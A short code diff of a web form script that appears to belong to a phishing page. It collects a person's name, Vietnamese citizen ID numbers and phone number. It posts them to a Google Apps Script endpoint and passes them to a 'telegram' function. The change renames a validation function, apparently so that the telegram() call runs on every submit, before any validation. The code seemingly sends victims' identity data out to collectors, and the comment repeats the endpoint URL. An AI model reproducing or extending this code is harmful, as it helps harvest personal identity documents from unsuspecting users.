@@ -899,6 +899,7 @@
                 const CCCD = $("#CCCD").val()
                 const sdt = $("#sdt").val()
                 console.log('kkkkk',hoten, CCCD,sdt)
+                // https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec
                 var url = 'https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec'
                 var jqxhr = $.ajax({
                             url: url,
@@ -943,7 +944,7 @@
                 }
             }
                             
-            function validateform1() {
+            function validateform() {
                 telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
                 
                 if ($("#hoten").val() == null || $("#hoten").val() === "") {
